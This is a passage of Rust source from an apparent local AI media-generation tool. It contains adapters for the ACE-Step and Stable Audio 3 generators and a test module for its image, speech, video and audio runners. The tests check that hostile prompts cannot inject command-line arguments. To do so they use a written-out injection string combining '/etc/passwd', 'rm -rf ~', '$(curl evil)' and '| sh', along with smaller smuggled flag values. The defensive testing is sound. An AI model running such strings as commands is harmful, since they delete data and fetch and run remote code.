            Ok::<Option<Value>, String>(Some(v["data"].clone()))
        } };
        ctl.stage("composing");
        let task = call("/release_task", body).await.map_err(Stop::Failed)?.and_then(|d| d["task_id"].as_str().map(String::from)).ok_or_else(|| Stop::Failed("ACE-Step gave no task id".into()))?;
        let file = loop {
            super::note_peak(ctl, super::resident::pgid());
            if super::watch(ctl, p, deadline) { super::resident::evict().await; return Err(Stop::from(ctl)); }
            tokio::time::sleep(std::time::Duration::from_secs(2)).await;
            // While it generates, the server may not answer at all; only a server that has gone away ends the wait.
            let d = match call("/query_result", json!({ "task_id_list": [task] })).await {
                Ok(Some(d)) => d,
                Ok(None) => continue,
                Err(e) => {
                    if let Some(how) = super::resident::ended().await { return Err(Stop::Failed(format!("the ACE-Step server stopped while generating ({how})"))); }
                    if super::resident::current().await.is_none() { return Err(Stop::Failed(e)); }
                    continue
                }
            };
            match acestep_state(&d) {
                AceState::Done(f) => break f,
                AceState::Running(pr) => if let Some(pr) = pr { *ctl.prog.lock().unwrap() = (pr, 100, "composing".into()); },
                AceState::Failed(why) => return Err(Stop::Failed(format!("ACE-Step: {why}"))),
            }
        };
        if file.is_empty() { return Err(Stop::Failed("ACE-Step made no file".into())); }
        let url = if file.starts_with("/v1/audio") { format!("{base}{file}") } else { reqwest::Url::parse_with_params(&format!("{base}/v1/audio"), &[("path", file.as_str())]).map_err(|e| Stop::Failed(e.to_string()))?.to_string() };
        let bytes = c.get(url).timeout(std::time::Duration::from_secs(120)).send().await.map_err(|e| Stop::Failed(format!("ACE-Step: {e}")))?.bytes().await.map_err(|e| Stop::Failed(e.to_string()))?;
        if bytes.is_empty() || bytes.len() > 200 << 20 { return Err(Stop::Failed("ACE-Step's file is empty or too big".into())); }
        std::fs::write(p.out.join("music.wav"), &bytes).map_err(|e| Stop::Failed(e.to_string()))?;
        super::resident::touch().await;
        Ok(None)
    }
}
pub enum AceState { Running(Option<u64>), Done(String), Failed(String) }
/// Reads `/query_result`'s `data` for one task: `[{ status: 0 running | 1 done | 2 failed, result: "<JSON string: [{ file,
/// progress, error }]>", progress_text }]`.
pub fn acestep_state(data: &Value) -> AceState {
    let item = &data[0];
    let result: Value = item["result"].as_str().and_then(|r| serde_json::from_str(r).ok()).unwrap_or(json!([]));
    match item["status"].as_i64() {
        Some(1) => AceState::Done(result[0]["file"].as_str().unwrap_or("").to_string()),
        Some(0) => AceState::Running(result[0]["progress"].as_f64().map(|p| (p.clamp(0.0, 1.0) * 100.0) as u64)),
        _ => AceState::Failed(result[0]["error"].as_str().or(item["progress_text"].as_str()).filter(|e| !e.is_empty()).unwrap_or("the song failed").chars().take(300).collect()),
    }
}

impl Adapter for AceStep {
    fn programs(&self) -> &'static [&'static str] { &["uv"] }
    fn ready(&self, _bins: &HashMap<String, PathBuf>) -> bool {
        Self::dir().map_or(false, |d| d.join("pyproject.toml").is_file() && d.join(".venv").is_dir() && d.join("checkpoints/acestep-v15-turbo").is_dir() && d.join("checkpoints/vae").is_dir())
    }
    fn steps(&self, _p: &Plan) -> Result<Vec<Vec<String>>, String> { Ok(vec![]) }
    fn resident(&self) -> Option<&'static str> { Some("acestep") }
    fn custom<'a>(&'a self, p: &'a Plan, ctl: &'a super::Ctl, deadline: std::time::Instant) -> Option<BoxFuture<'a, Result<Option<Value>, super::Stop>>> { Some(Box::pin(self.run(p, ctl, deadline))) }
}

/* ---------- Stable Audio 3 (Stability's own MLX build, `sa3`, installed by hand in runners/) ---------- */

pub struct Sa3;
impl Sa3 { pub fn bin() -> Option<PathBuf> { super::catalog::runners_dir().map(|d| d.join("stable-audio-3/optimized/mlx/sa3")) } }
impl Adapter for Sa3 {
    fn programs(&self) -> &'static [&'static str] { &[] }
    // The wrapper runs its own .venv; the weights are a Hugging Face repo, checked by the catalog.
    // The wrapper runs its own .venv and reads its weights from models/mlx (links into the HF cache, made by
    // `models add`): every link has to lead somewhere.
    fn ready(&self, _bins: &HashMap<String, PathBuf>) -> bool {
        Self::bin().map_or(false, |b| super::catalog::is_exec(&b) && b.parent().map_or(false, |d| d.join(".venv").is_dir()
            && ["t5gemma_f16.npz", "same_s_decoder_f32.npz", "dit_sm-music_f16.npz", "dit_sm-sfx_f16.npz"].iter().all(|f| d.join("models/mlx").join(f).is_file())))
    }
    fn steps(&self, p: &Plan) -> Result<Vec<Vec<String>>, String> {
        let bin = Self::bin().ok_or("sa3 isn't installed")?;
        let prompt = p.prompt();
        if prompt.trim().is_empty() { return Err("describe the sound in the prompt".into()); }
        let music = p.task == "music.generate";
        let secs = p.inputs["duration_s"].as_f64().unwrap_or(10.0).clamp(1.0, 120.0);
        // --out must be absolute (the wrapper changes folder); it is: the job's own output folder.
        let mut a = vec![Plan::s(&bin), format!("--prompt={prompt}"), "--dit".into(), if music { "sm-music" } else { "sm-sfx" }.into(), "--decoder".into(), "same-s".into(),
            "--seconds".into(), format!("{secs:.1}"), "--seed".into(), p.seed().to_string()];
        if let Some(n) = p.inputs["negative_prompt"].as_str().filter(|n| !n.trim().is_empty()) { a.extend([format!("--negative-prompt={n}"), "--cfg".into(), "3.0".into()]); }
        if let Some(st) = p.param("steps").as_u64() { a.extend(["--steps".into(), st.clamp(1, 50).to_string()]); }
        // A variation of a recording (re-encoded in the VM first).
        if let Some(src) = p.refs_of("source_audio").first() {
            a.extend(["--init-audio".into(), Plan::s(&src.path), "--init-noise-level".into(), format!("{:.2}", p.param("init_noise_level").as_f64().unwrap_or(0.6).clamp(0.4, 0.8))]);
        }
        a.extend(["--out".into(), Plan::s(&p.out.join(if music { "music.wav" } else { "sound.wav" }))]);
        Ok(vec![a])
    }
}

fn round2(x: f64) -> f64 { (x * 100.0).round() / 100.0 }

fn write_transcript(out: &Path, text: &str, segments: &Value, language: Option<&str>) -> Result<(), String> {
    std::fs::write(out.join("transcript.txt"), format!("{text}\n")).map_err(|e| e.to_string())?;
    std::fs::write(out.join("transcript.json"), serde_json::to_vec_pretty(&json!({ "text": text, "language": language, "segments": segments })).unwrap()).map_err(|e| e.to_string())
}

/// Regular files directly in a folder (no links, no folders).
pub fn files(dir: &Path) -> Vec<PathBuf> {
    std::fs::read_dir(dir).map(|r| r.flatten().filter(|e| e.file_type().map_or(false, |t| t.is_file())).map(|e| e.path()).collect()).unwrap_or_default()
}

#[cfg(test)]
mod tests {
    use super::*;
    fn plan(task: &str, inputs: Value) -> Plan {
        let work = std::env::temp_dir().join(format!("pavilion-plan-{}", rand::random::<u32>()));
        std::fs::create_dir_all(work.join("out")).unwrap();
        let mut bins = HashMap::new();
        for b in ["ffmpeg", "mflux-generate-flux2", "mflux-generate-flux2-edit", "mflux-generate-z-image-turbo", "mflux-upscale-seedvr2", "mlx_audio.tts.generate", "mlx_whisper", "parakeet-mlx"] { bins.insert(b.to_string(), PathBuf::from(format!("/opt/bin/{b}"))); }
        Plan { task: task.into(), inputs, refs: vec![], out: work.join("out"), work, bins, weights: Some(PathBuf::from("/models/snap")), repo: Some("org/model".into()), also: vec![], weights_file: None,
            base_model: Some("flux2-klein-4b".into()), size: Some(WxH { width: 512, height: 512 }), chunks: vec![] }
    }
    const NASTY: &str = "--output /etc/passwd; rm -rf ~ $(curl evil) `id` | sh";

    #[test]
    fn mflux_never_puts_the_prompt_on_the_command_line() {
        let p = plan("image.generate", json!({ "prompt": NASTY, "n": 2, "seed": 7, "params": { "steps": 3 } }));
        let steps = MFLUX_FLUX2.steps(&p).unwrap();
        assert_eq!(steps.len(), 2);
        let a = &steps[0];
        assert_eq!(a[0], "/opt/bin/mflux-generate-flux2");
        assert!(a.iter().all(|x| !x.contains("passwd") && !x.contains("rm -rf")), "{a:?}");
        assert_eq!(std::fs::read_to_string(p.work.join("prompt.txt")).unwrap(), NASTY);
        let at = |k: &str| a.iter().position(|x| x == k).map(|i| a[i + 1].clone());
        assert_eq!(at("--seed").as_deref(), Some("7"));
        assert_eq!(steps[1][steps[1].iter().position(|x| x == "--seed").unwrap() + 1], "8");
        assert_eq!(at("--steps").as_deref(), Some("3"));
        assert_eq!(at("--width").as_deref(), Some("512"));
        assert_eq!(at("--base-model").as_deref(), Some("flux2-klein-4b"));
        assert_eq!(at("--model").as_deref(), Some("org/model"));
        assert!(a.contains(&"--no-metadata".to_string()));
        assert!(at("--output").unwrap().ends_with("out/image-0.png"));
    }

    #[test]
    fn mflux_edits_take_the_references_and_their_size() {
        let mut p = plan("image.edit", json!({ "prompt": "make it snow" }));
        p.refs = vec![Input { role: "subject".into(), path: p.work.join("refs/0.png"), seconds: None, transcript: None }];
        let a = &MFLUX_FLUX2.steps(&p).unwrap()[0];
        assert_eq!(a[0], "/opt/bin/mflux-generate-flux2-edit");
        let i = a.iter().position(|x| x == "--image-paths").unwrap();
        assert!(a[i + 1].ends_with("refs/0.png"));
        assert!(!a.contains(&"--width".to_string()), "an edit keeps the reference's size");
        p.refs.clear();
        assert!(MFLUX_FLUX2.steps(&p).is_err());
    }

    #[test]
    fn kokoro_keeps_text_in_one_argument() {
        let p = plan("speech", json!({ "prompt": "-h --model x", "params": { "voice": "bm_george" } }));
        let a = &Kokoro.steps(&p).unwrap()[0];
        assert!(a.contains(&"--text=-h --model x".to_string()), "{a:?}");
        assert_eq!(a.iter().filter(|x| *x == "--model").count(), 1);
        assert_eq!(a[a.iter().position(|x| x == "--lang_code").unwrap() + 1], "b");
        assert!(Kokoro.steps(&plan("speech", json!({ "prompt": "  " }))).is_err());
    }

    #[test]
    fn whisper_runs_per_chunk_with_a_timeout_from_the_length() {
        let mut p = plan("speech.transcribe", json!({ "language": "en", "prompt": "--output-dir /" }));
        p.chunks = vec![(p.work.join("chunks/000.wav"), 360.0), (p.work.join("chunks/001.wav"), 40.0)];
        let steps = MlxWhisper.steps(&p).unwrap();
        assert_eq!(steps.len(), 2);
        assert!(steps[1][1].ends_with("chunks/001.wav"));
        assert!(steps[0].contains(&"--initial-prompt=--output-dir /".to_string()));
        assert_eq!(steps[0].iter().filter(|x| *x == "--output-dir").count(), 1);
        assert_eq!(MlxWhisper.timeout_s(&p, 0), 1230);
        p.chunks = vec![(PathBuf::from("a"), 2.0)];
        assert_eq!(MlxWhisper.timeout_s(&p, 0), 60);
        p.chunks = vec![(PathBuf::from("a"), 3000.0)];
        assert_eq!(MlxWhisper.timeout_s(&p, 0), 1800);
    }

    #[test]
    fn whisper_merges_parts_with_offsets() {
        let mut p = plan("speech.transcribe", json!({}));
        p.chunks = vec![(PathBuf::from("a"), 360.0), (PathBuf::from("b"), 10.0)];
        std::fs::create_dir_all(p.work.join("parts")).unwrap();
        std::fs::write(p.work.join("parts/part-000.json"), r#"{"text":" Hello.","language":"en","segments":[{"start":0,"end":1.5,"text":" Hello."}]}"#).unwrap();
        std::fs::write(p.work.join("parts/part-001.json"), r#"{"text":" World.","segments":[{"start":1,"end":2,"text":" World."}]}"#).unwrap();
        let r = MlxWhisper.finish(&p).unwrap().unwrap();
        assert_eq!(r["text"], "Hello. World.");
        let j: Value = serde_json::from_slice(&std::fs::read(p.out.join("transcript.json")).unwrap()).unwrap();
        assert_eq!(j["segments"][1]["start"], 361.0);
        assert_eq!(std::fs::read_to_string(p.out.join("transcript.txt")).unwrap(), "Hello. World.\n");
    }

    #[test]
    fn test_runners_build_filters_from_numbers_only() {
        let p = plan("image.generate", json!({ "prompt": "x'],drawtext=text=pwned", "seed": 400, "n": 2 }));
        let s = TestPattern.steps(&p).unwrap();
        assert_eq!(s.len(), 2);
        assert!(s.iter().flatten().all(|x| !x.contains("pwned")));
        assert!(s[0].contains(&"scale=512:512,hue=h=40".to_string()));
        let p = plan("speech", json!({ "prompt": "hi", "duration_s": 2.5, "params": { "frequency": 880 } }));
        let a = &TestTone.steps(&p).unwrap()[0];
        assert!(a.contains(&"sine=frequency=880:sample_rate=24000:duration=2.50".to_string()));
        assert!(a.last().unwrap().ends_with("speech.wav"));
    }

    #[test]
    fn z_image_takes_a_negative_prompt_flux2_doesnt() {
        let p = plan("image.generate", json!({ "prompt": "x", "negative_prompt": "-blurry" }));
        let a = &MFLUX_Z_IMAGE.steps(&p).unwrap()[0];
        assert_eq!(a[0], "/opt/bin/mflux-generate-z-image-turbo");
        assert!(a.contains(&"--negative-prompt=-blurry".to_string()));
        assert_eq!(a[a.iter().position(|x| x == "--steps").unwrap() + 1], "9");
        assert!(!MFLUX_FLUX2.steps(&p).unwrap()[0].iter().any(|x| x.starts_with("--negative-prompt")));
        assert!(MFLUX_Z_IMAGE.steps(&plan("image.edit", json!({ "prompt": "x" }))).is_err(), "no edit program");
    }

    fn png(p: &Path, w: u32, h: u32) {
        let mut v = b"\x89PNG\r\n\x1a\n\0\0\0\x0dIHDR".to_vec(); v.extend(w.to_be_bytes()); v.extend(h.to_be_bytes()); v.extend([8, 2, 0, 0, 0, 0, 0, 0, 0]);
        std::fs::write(p, v).unwrap();
    }

    #[test]
    fn seedvr2_doubles_up_to_the_cap() {
        let mut p = plan("upscale", json!({ "params": { "softness": 0.3 } }));
        let src = p.work.join("0.png");
        png(&src, 640, 480);
        p.refs = vec![Input { role: "subject".into(), path: src.clone(), seconds: None, transcript: None }];
        let a = &SeedVr2.steps(&p).unwrap()[0];
        assert_eq!(a[a.iter().position(|x| x == "--resolution").unwrap() + 1], "960");
        assert_eq!(a[a.iter().position(|x| x == "--softness").unwrap() + 1], "0.30");
        assert_eq!(a[a.iter().position(|x| x == "--model").unwrap() + 1], "seedvr2-3b");
        png(&src, 2048, 1536);
        let a = &SeedVr2.steps(&p).unwrap()[0];
        assert_eq!(a[a.iter().position(|x| x == "--resolution").unwrap() + 1], "2048");
    }

    #[test]
    fn voice_clone_takes_the_transcript_in_one_argument() {
        let mut p = plan("speech.clone", json!({ "prompt": "Hi there" }));
        p.refs = vec![Input { role: "voice".into(), path: p.work.join("refs/0.wav"), seconds: Some(4.0), transcript: Some("-v my voice".into()) }];
        let a = &Qwen3Tts.steps(&p).unwrap()[0];
        assert!(a.contains(&"--ref_text=-v my voice".to_string()) && a.iter().any(|x| x.ends_with("refs/0.wav")));
        p.refs.clear();
        assert!(Qwen3Tts.steps(&p).is_err());
    }

    #[test]
    fn transcribers_per_platform() {
        let mut p = plan("speech.transcribe", json!({ "prompt": "-of /etc/x" }));
        p.chunks = vec![(p.work.join("chunks/000.wav"), 360.0)];
        let a = &Parakeet.steps(&p).unwrap()[0];
        assert_eq!(a[0], "/opt/bin/parakeet-mlx");
        assert_eq!(a[a.iter().position(|x| x == "--output-template").unwrap() + 1], "part-000");
        p.weights_file = Some(PathBuf::from("/models/snap/ggml-small.bin"));
        p.bins.insert("whisper-cli".into(), PathBuf::from("/usr/local/bin/whisper-cli"));
        let a = &WhisperCpp.steps(&p).unwrap()[0];
        assert_eq!(a[..3], ["/usr/local/bin/whisper-cli".to_string(), "-m".into(), "/models/snap/ggml-small.bin".into()]);
        assert_eq!(a[a.iter().position(|x| x == "-l").unwrap() + 1], "auto");
        assert_eq!(a[a.iter().position(|x| x == "--prompt").unwrap() + 1], "-of /etc/x");
        assert_eq!(a.iter().filter(|x| *x == "-of").count(), 1);
        assert_eq!(WhisperCpp.progress("whisper_print_progress_callback: progress =  45%", &p), Some((45, 100)));
        // whisper.cpp's JSON joins like the others.
        std::fs::create_dir_all(p.work.join("parts")).unwrap();
        std::fs::write(p.work.join("parts/part-000.json"), r#"{"result":{"language":"en"},"transcription":[{"offsets":{"from":0,"to":1500},"text":" Hello"},{"offsets":{"from":1500,"to":2000},"text":" there."}]}"#).unwrap();
        let r = WhisperCpp.finish(&p).unwrap().unwrap();
        assert_eq!(r["text"], "Hello there.");
        assert_eq!(r["language"], "en");
    }

    #[test]
    fn video_frames_and_argv() {
        assert_eq!(ltx_frames(3.0, 24, 121), 65);
        assert_eq!(ltx_frames(10.0, 24, 121), 121);
        assert_eq!(ltx_frames(0.1, 24, 121), 9);
        let mut p = plan("video.from_image", json!({ "prompt": "-o /etc/x", "duration_s": 2 }));
        p.size = Some(WxH { width: 512, height: 384 });
        p.bins.insert("uv".into(), PathBuf::from("/opt/bin/uv"));
        p.refs = vec![Input { role: "first_frame".into(), path: p.work.join("refs/0.png"), seconds: None, transcript: None }];
        if super::super::catalog::runners_dir().is_some() {
            p.also = vec!["mlx-community/gemma-3-12b-it-4bit".into()];
            let a = &Ltx2.steps(&p).unwrap()[0];
            assert!(a.contains(&"--prompt=-o /etc/x".to_string()) && a.contains(&"--no-sync".to_string()) && a.contains(&"--offline".to_string()));
            assert_eq!(a[a.iter().position(|x| x == "--frames").unwrap() + 1], "49");
            assert_eq!(a[a.iter().position(|x| x == "--gemma").unwrap() + 1], "mlx-community/gemma-3-12b-it-4bit");
            assert_eq!(a[a.iter().position(|x| x == "--image").unwrap() + 2], "0");
            let w = &Wan22.steps(&p).unwrap()[0];
            assert!(w.contains(&"1280*704".to_string()) && w.contains(&"--prompt=-o /etc/x".to_string()));
            assert_eq!(w[w.iter().position(|x| x == "--frame_num").unwrap() + 1], "45");
        }
    }

    #[test]
    fn stable_audio_argv() {
        if Sa3::bin().is_none() { return; }
        let mut p = plan("audio.generate", json!({ "prompt": "--out /etc/x rain", "negative_prompt": "music", "duration_s": 500, "seed": 3, "params": { "init_noise_level": 0.9 } }));
        p.refs = vec![Input { role: "source_audio".into(), path: p.work.join("refs/0.wav"), seconds: Some(3.0), transcript: None }];
        let a = &Sa3.steps(&p).unwrap()[0];
        assert!(a.contains(&"--prompt=--out /etc/x rain".to_string()) && a.contains(&"--negative-prompt=music".to_string()));
        assert_eq!(a.iter().filter(|x| *x == "--out").count(), 1);
        assert!(Path::new(a.last().unwrap()).is_absolute() && a.last().unwrap().ends_with("sound.wav"));
        assert_eq!(a[a.iter().position(|x| x == "--seconds").unwrap() + 1], "120.0");
        assert_eq!(a[a.iter().position(|x| x == "--dit").unwrap() + 1], "sm-sfx");
        assert_eq!(a[a.iter().position(|x| x == "--init-noise-level").unwrap() + 1], "0.80");
    }

    #[test]
    fn acestep_answers() {
        let running = json!([{ "task_id": "t", "status": 0, "result": "[{\"file\": \"\", \"status\": 0, \"progress\": 0.42, \"stage\": \"diffusion\"}]", "progress_text": "step 3" }]);
        assert!(matches!(acestep_state(&running), AceState::Running(Some(42))));
        let done = json!([{ "task_id": "t", "status": 1, "result": "[{\"file\": \"/v1/audio?path=%2Ftmp%2Fa.wav\", \"status\": 1}]" }]);
        assert!(matches!(acestep_state(&done), AceState::Done(f) if f == "/v1/audio?path=%2Ftmp%2Fa.wav"));
        let failed = json!([{ "task_id": "t", "status": 2, "result": "[{\"file\": \"\", \"status\": 2, \"error\": \"out of memory\"}]" }]);
        assert!(matches!(acestep_state(&failed), AceState::Failed(e) if e == "out of memory"));
        assert!(matches!(acestep_state(&json!([])), AceState::Failed(_)));
    }

    #[test]
    fn progress_lines() {
        assert_eq!(tqdm(" 45%|████▌     | 9/20 [00:03<00:04,  2.50it/s]"), Some((9, 20)));
        assert_eq!(tqdm("100%|██████████| 4/4 [00:30<00:00,  7.5s/it]"), Some((4, 4)));
        assert_eq!(tqdm("  0%|          | 0/3300 [00:00<?, ?frames/s]"), Some((0, 3300)));
        assert_eq!(tqdm("Loading 2/3 shards"), None);
        assert_eq!(tqdm("50%| bad | 9/x"), None);
        assert_eq!(tqdm("50%|bar| 30/20 [..]"), None);
        assert_eq!(ffmpeg_progress("out_time_us=1500000", 3.0), Some((15, 30)));
        assert_eq!(ffmpeg_progress("out_time_us=99000000", 3.0), Some((30, 30)));
        assert_eq!(ffmpeg_progress("out_time_us=N/A", 3.0), None);
        assert_eq!(ffmpeg_progress("frame=1", 3.0), None);
    }
}
